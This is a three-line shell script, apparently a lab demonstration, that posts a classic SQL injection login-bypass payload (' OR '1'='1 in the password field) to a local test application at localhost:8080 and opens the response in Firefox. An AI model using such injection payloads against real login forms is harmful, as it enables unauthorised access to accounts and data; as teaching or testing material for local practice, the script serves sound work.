echo "Realizando un SQL Injection"
curl -X POST -d "name=Mark&password=' OR '1'='1" localhost:8080/sqlijc > resultado_sqlInjection.html
firefox resultado_sqlInjection.html

